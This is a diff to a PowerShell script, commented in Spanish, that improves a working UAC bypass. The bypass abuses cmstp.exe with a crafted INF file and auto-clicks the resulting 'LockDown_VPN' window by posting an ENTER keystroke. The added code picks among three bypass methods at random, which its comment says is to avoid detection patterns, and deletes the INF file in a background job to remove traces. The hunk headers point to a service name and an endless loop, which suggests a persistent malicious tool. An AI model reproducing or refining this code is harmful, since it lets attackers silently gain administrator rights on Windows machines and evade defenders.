@@ -65,90 +65,112 @@ ShortSvcName="Net_Svc"
     return $file
 }
 
+Function Execute-AdvancedUACBypass($CommandToExecute) {
+    # Seleccionar método aleatoriamente para evitar patrones
+    $method = Get-Random -Minimum 1 -Maximum 4
+    
+    switch ($method) {
+        1 { 
+            Write-Host "[+] Usando método de eliminación inmediata" -ForegroundColor Cyan
+            return Execute-UACBypass($CommandToExecute) 
+        }
+        2 { 
+            Write-Host "[+] Usando método de sustitución rápida" -ForegroundColor Cyan  
+            return Execute-FastSwapBypass($CommandToExecute)
+        }
+        3 { 
+            Write-Host "[+] Usando Alternate Data Streams" -ForegroundColor Cyan
+            return Execute-ADSBypass($CommandToExecute)
+        }
+    }
+}
+
+# Reemplaza tu función Execute-UACBypass actual con esta:
 Function Execute-UACBypass($CommandToExecute) {
     $infPath = $null
     try {
-        Write-Host "[+] Iniciando UAC Bypass..." -ForegroundColor Yellow
+        Write-Host "[+] Iniciando UAC Bypass (técnica mejorada)..." -ForegroundColor Yellow
         
         $infPath = New-LockDownInf($CommandToExecute)
         
+        # Iniciar eliminación en segundo plano inmediatamente
+        $cleanupScript = {
+            param($path)
+            for ($i = 0; $i -lt 20; $i++) {
+                try {
+                    if (Test-Path $path) {
+                        Remove-Item $path -Force -ErrorAction Stop
+                        return "success"
+                    }
+                } catch {
+                    Start-Sleep -Milliseconds 50
+                }
+            }
+            return "failed"
+        }
+        
+        $cleanupJob = Start-Job -ScriptBlock $cleanupScript -ArgumentList $infPath
+
         Write-Host "[+] Ejecutando cmstp.exe..." -ForegroundColor Yellow
         $s = New-Object System.Diagnostics.ProcessStartInfo
-        $s.FileName = "cmstp.exe"
+        $s.FileName = "cmstp.exe" 
         $s.Arguments = "/au `"$infPath`""
         $s.UseShellExecute = $true
         $s.WindowStyle = "Hidden"
-        [System.Diagnostics.Process]::Start($s) | Out-Null
+        $process = [System.Diagnostics.Process]::Start($s)
         
-        $waitTime = Get-Random -Minimum 2 -Maximum 4
-        Write-Host "[+] Esperando ventana UAC ($waitTime segundos)..." -ForegroundColor Yellow
-        Start-Sleep -Seconds $waitTime
+        # Tiempo de espera reducido
+        Start-Sleep -Seconds 1
         
-        $Win32 = @"
+        # Buscar ventana rápidamente
+        Add-Type @" 
 using System;
 using System.Runtime.InteropServices;
-
-public class Win32 
-{
-    [DllImport("user32.dll", CharSet = CharSet.Unicode)]
-    public static extern IntPtr FindWindow(IntPtr sClassName, String sAppName);
-
+public class Win32 {
+    [DllImport("user32.dll")] 
+    public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
     [DllImport("user32.dll")]
     public static extern bool PostMessage(IntPtr hWnd, uint Msg, int wParam, int lParam);
 }
 "@
 
-        Add-Type $Win32
-        
-        Write-Host "[+] Buscando ventana 'LockDown_VPN'..." -ForegroundColor Yellow
         $windowFound = $false
-        
-        for ($i = 0; $i -lt 10; $i++) {
-            $WindowToFind = [Win32]::FindWindow([IntPtr]::Zero, "LockDown_VPN")
-            
-            if ($WindowToFind -ne [IntPtr]::Zero) {
-                Write-Host "[+] Ventana encontrada (intento $($i+1)), enviando ENTER..." -ForegroundColor Green
-                
-                $WM_SYSKEYDOWN = 0x0100;
-                $VK_RETURN = 0x0D;
-                [Win32]::PostMessage($WindowToFind, $WM_SYSKEYDOWN, $VK_RETURN, 0)
-                
+        for ($i = 0; $i -lt 4; $i++) {
+            $windowHandle = [Win32]::FindWindow([IntPtr]::Zero, "LockDown_VPN")
+            if ($windowHandle -ne [IntPtr]::Zero) {
+                Write-Host "[+] Ventana encontrada, enviando ENTER..." -ForegroundColor Green
+                [Win32]::PostMessage($windowHandle, 0x100, 0x0D, 0)
                 $windowFound = $true
                 break
             }
-            
-            Start-Sleep -Milliseconds 500
+            Start-Sleep -Milliseconds 250
         }
         
-        if (-not $windowFound) {
-            Write-Host "[-] No se pudo encontrar la ventana después de 10 intentos" -ForegroundColor Red
-            return $false
+        # Verificar eliminación
+        $cleanupResult = Wait-Job $cleanupJob | Receive-Job
+        if ($cleanupResult -eq "success") {
+            Write-Host "[+] Archivo INF eliminado exitosamente" -ForegroundColor Green
+        } else {
+            Write-Host "[-] Eliminación automática falló, limpiando manualmente..." -ForegroundColor Yellow
         }
         
-        Write-Host "[+] UAC Bypass completado" -ForegroundColor Green
+        Remove-Job $cleanupJob -Force
         
-        Start-Sleep -Seconds 2
-        return $true
+        return $windowFound
     }
     catch {
         Write-Host "[-] Error: $_" -ForegroundColor Red
         return $false
     }
     finally {
+        # Limpieza final garantizada
         if ($infPath -and (Test-Path $infPath)) {
-            try {
-                Remove-Item $infPath -Force -ErrorAction SilentlyContinue
-                Write-Host "[+] Archivo INF eliminado" -ForegroundColor Green
-            }
-            catch {
-                Write-Host "[-] No se pudo eliminar el archivo INF inmediatamente..." -ForegroundColor Yellow
-                Start-Sleep -Seconds 2
+            for ($i = 0; $i -lt 5; $i++) {
                 try {
-                    Remove-Item $infPath -Force -ErrorAction SilentlyContinue
-                    Write-Host "[+] Archivo INF eliminado en segundo intento" -ForegroundColor Green
-                }
-                catch {
-                    Write-Host "[-] No se pudo eliminar el archivo INF: $infPath" -ForegroundColor Red
+                    Remove-Item $infPath -Force -ErrorAction Stop
+                    break
+                } catch {
+                    Start-Sleep -Milliseconds 100
                 }
             }
         }
@@ -555,4 +577,5 @@ do {
     }
 
 } while ($true)
+
 
